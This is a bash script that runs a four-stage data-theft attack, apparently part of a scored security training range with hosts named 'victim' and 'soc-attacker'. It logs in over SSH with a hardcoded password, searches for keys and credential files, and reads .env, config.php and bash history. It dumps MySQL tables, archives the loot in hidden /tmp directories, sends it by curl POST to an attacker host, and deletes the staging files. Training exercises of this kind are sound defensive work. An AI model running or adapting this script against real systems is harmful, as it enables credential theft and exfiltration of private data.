#!/bin/bash
###############################################################################
# VECTOR 5: Sensitive Data Exfiltration
# Kill Chain: File Discovery → Credential Harvest → DB Dump → HTTP Exfil
# MITRE ATT&CK: T1083 → T1552.001 → T1005 → T1048.003
###############################################################################
set -uo pipefail

VICTIM="${VICTIM_HOST:-victim}"
ATTACKER="${ATTACKER_HOST:-soc-attacker}"
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'

log()  { echo -e "${CYAN}[$(date +%H:%M:%S)]${NC} $1"; }
ok()   { echo -e "${GREEN}[✓]${NC} $1"; }
fail() { echo -e "${RED}[✗]${NC} $1"; }
info() { echo -e "${YELLOW}[*]${NC} $1"; }

TOTAL_POINTS=0
report_stage() {
    local stage="$1" mitre="$2" tactic="$3" points="$4" status="$5"
    TOTAL_POINTS=$((TOTAL_POINTS + points))
    echo -e "\n${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  Stage: ${YELLOW}${stage}${NC}"
    echo -e "  MITRE: ${mitre} (${tactic})"
    echo -e "  Status: ${status}  |  Points: +${points}  |  Total: ${TOTAL_POINTS}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
}

do_ssh() {
    sshpass -p "password123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null victim@"$VICTIM" "$@" 2>/dev/null
}

echo -e "\n${RED}╔══════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║       VECTOR 5: SENSITIVE DATA EXFILTRATION               ║${NC}"
echo -e "${RED}║  Discover → Harvest → Dump → Exfiltrate                   ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════════╝${NC}\n"

###############################################################################
# STAGE 1: Sensitive File Discovery (T1083 - File and Directory Discovery)
###############################################################################
info "Stage 1: Sensitive File Discovery"
log "Searching for sensitive files on victim..."

FILE_ENUM=$(do_ssh '
echo "=== Sensitive files by extension ==="
find / -maxdepth 4 \( -name "*.csv" -o -name "*.env" -o -name "*.key" -o -name "*.pem" -o -name "*.conf" -o -name "config.*" -o -name "*.sql" -o -name "*.bak" \) 2>/dev/null | head -30

echo ""
echo "=== Files with passwords ==="
grep -rl "password\|passwd\|secret\|API_KEY" /home /var/www /etc 2>/dev/null | head -15

echo ""
echo "=== World-readable sensitive files ==="
find /etc -maxdepth 2 -perm -004 -name "*.conf" 2>/dev/null | head -10

echo ""
echo "=== SSH keys ==="
find / -maxdepth 4 -name "id_rsa*" -o -name "authorized_keys" 2>/dev/null | head -5
' 2>/dev/null)

echo "$FILE_ENUM"

FILE_COUNT=$(echo "$FILE_ENUM" | grep -c "/" 2>/dev/null || echo 0)
if [ "$FILE_COUNT" -gt 0 ]; then
    ok "Found ${FILE_COUNT} potentially sensitive files"
    report_stage "File Discovery" "T1083" "Discovery" 10 "${GREEN}SUCCESS${NC}"
else
    fail "No sensitive files found"
    report_stage "File Discovery" "T1083" "Discovery" 3 "${RED}FAILED${NC}"
fi

sleep 2

###############################################################################
# STAGE 2: Credential Harvesting (T1552.001 - Credentials in Files)
###############################################################################
info "Stage 2: Credential Harvesting"
log "Extracting credentials from config files..."

CRED_OUT=$(do_ssh '
echo "=== Web App Config ==="
cat /var/www/html/config.php 2>/dev/null

echo ""
echo "=== Environment Files ==="
cat /var/www/html/.env 2>/dev/null
cat /home/victim/.env 2>/dev/null

echo ""
echo "=== SSH Config ==="
cat /etc/ssh/sshd_config 2>/dev/null | grep -iE "Password|Permit|Auth"

echo ""
echo "=== MySQL Config ==="
cat /etc/mysql/my.cnf 2>/dev/null | head -20

echo ""
echo "=== Bash History ==="
cat /home/victim/.bash_history /root/.bash_history 2>/dev/null | grep -iE "pass|mysql|ssh|curl|wget" | head -10
' 2>/dev/null)

echo "$CRED_OUT"

# Save harvested creds
echo "$CRED_OUT" > /tmp/harvested_creds.txt
CRED_COUNT=$(echo "$CRED_OUT" | grep -ciE "password|secret|key|token" 2>/dev/null || echo 0)

if [ "$CRED_COUNT" -gt 0 ]; then
    ok "Harvested ${CRED_COUNT} credential references"
    report_stage "Credential Harvesting" "T1552.001" "Credential Access" 20 "${GREEN}SUCCESS${NC}"
else
    report_stage "Credential Harvesting" "T1552.001" "Credential Access" 8 "${YELLOW}PARTIAL${NC}"
fi

sleep 2

###############################################################################
# STAGE 3: Database Dump (T1005 - Data from Local System)
###############################################################################
info "Stage 3: Database Extraction"
log "Dumping MySQL databases..."

DB_OUT=$(do_ssh '
echo "=== Database List ==="
mysql -u root -e "SHOW DATABASES;" 2>/dev/null

echo ""
echo "=== Users Table ==="
mysql -u root -e "SELECT * FROM victim_db.users;" 2>/dev/null

echo ""
echo "=== Sensitive Data Table ==="
mysql -u root -e "SELECT * FROM victim_db.sensitive_data;" 2>/dev/null

echo ""
echo "=== Table Structures ==="
mysql -u root -e "SHOW TABLES FROM victim_db;" 2>/dev/null
' 2>/dev/null)

echo "$DB_OUT"

# Save DB dump
echo "$DB_OUT" > /tmp/db_dump.txt
DB_ROWS=$(echo "$DB_OUT" | wc -l)

if [ "$DB_ROWS" -gt 5 ]; then
    ok "Database dumped — ${DB_ROWS} lines of data"
    report_stage "Database Dump" "T1005" "Collection" 25 "${GREEN}SUCCESS${NC}"
else
    fail "Database dump returned minimal data"
    report_stage "Database Dump" "T1005" "Collection" 8 "${YELLOW}PARTIAL${NC}"
fi

sleep 2

###############################################################################
# STAGE 4: HTTP Exfiltration (T1048.003 - Exfil Over Unencrypted Protocol)
###############################################################################
info "Stage 4: Data Exfiltration via HTTP"
log "Packaging and exfiltrating stolen data..."

EXFIL_OUT=$(do_ssh '
# Create staging directory
mkdir -p /tmp/.staging 2>/dev/null

# Stage sensitive files
cp /home/victim/sensitive_data/employee_records.csv /tmp/.staging/ 2>/dev/null
cp /home/victim/sensitive_data/network_map.txt /tmp/.staging/ 2>/dev/null
cp /var/www/html/config.php /tmp/.staging/ 2>/dev/null
cp /var/www/html/.env /tmp/.staging/ 2>/dev/null

# Database dump
mysql -u root -e "SELECT * FROM victim_db.users; SELECT * FROM victim_db.sensitive_data;" > /tmp/.staging/db_dump.sql 2>/dev/null

echo "=== Staged files ==="
ls -la /tmp/.staging/

# Create archive
tar czf /tmp/.data.tar.gz -C /tmp/.staging . 2>/dev/null
echo "Archive size: $(du -h /tmp/.data.tar.gz 2>/dev/null | cut -f1)"

# Attempt HTTP exfiltration
curl -s -X POST "http://soc-attacker:8888/upload" -F "file=@/tmp/.data.tar.gz" 2>/dev/null && echo "EXFIL_HTTP_OK" || echo "EXFIL_HTTP_FAIL"

# Fallback: base64 encode and send via DNS/HTTP
cat /tmp/.data.tar.gz | base64 | head -5
echo "... (data truncated for display)"

# Cleanup staging
rm -rf /tmp/.staging /tmp/.data.tar.gz 2>/dev/null

echo "EXFIL_ATTEMPTED"
' 2>/dev/null)

echo "$EXFIL_OUT"

if echo "$EXFIL_OUT" | grep -q "EXFIL_HTTP_OK"; then
    ok "Data exfiltrated via HTTP POST to attacker"
    report_stage "HTTP Exfiltration" "T1048.003" "Exfiltration" 30 "${GREEN}SUCCESS${NC}"
elif echo "$EXFIL_OUT" | grep -q "EXFIL_ATTEMPTED"; then
    ok "Exfiltration attempted (data staged and archived)"
    report_stage "HTTP Exfiltration" "T1048.003" "Exfiltration" 20 "${YELLOW}PARTIAL${NC}"
else
    fail "Exfiltration failed"
    report_stage "HTTP Exfiltration" "T1048.003" "Exfiltration" 5 "${RED}FAILED${NC}"
fi

###############################################################################
# SUMMARY
###############################################################################
echo -e "\n${RED}╔══════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║                 ATTACK CHAIN COMPLETE                     ║${NC}"
echo -e "${RED}╠══════════════════════════════════════════════════════════╣${NC}"
echo -e "${RED}║${NC}  Vector:     Sensitive Data Exfiltration                ${RED}║${NC}"
echo -e "${RED}║${NC}  Stages:     4/4 executed                                ${RED}║${NC}"
echo -e "${RED}║${NC}  Total Score: ${GREEN}${TOTAL_POINTS} points${NC}                              ${RED}║${NC}"
echo -e "${RED}║${NC}                                                          ${RED}║${NC}"
echo -e "${RED}║${NC}  MITRE ATT&CK Techniques:                               ${RED}║${NC}"
echo -e "${RED}║${NC}    T1083      File Discovery           (Discovery)       ${RED}║${NC}"
echo -e "${RED}║${NC}    T1552.001  Credentials in Files     (Cred Access)     ${RED}║${NC}"
echo -e "${RED}║${NC}    T1005      Data from Local System   (Collection)      ${RED}║${NC}"
echo -e "${RED}║${NC}    T1048.003  Exfil Over Unencrypted   (Exfiltration)    ${RED}║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════════╝${NC}\n"

log "Exfiltrated data saved locally:"
ls -la /tmp/harvested_creds.txt /tmp/db_dump.txt 2>/dev/null || true
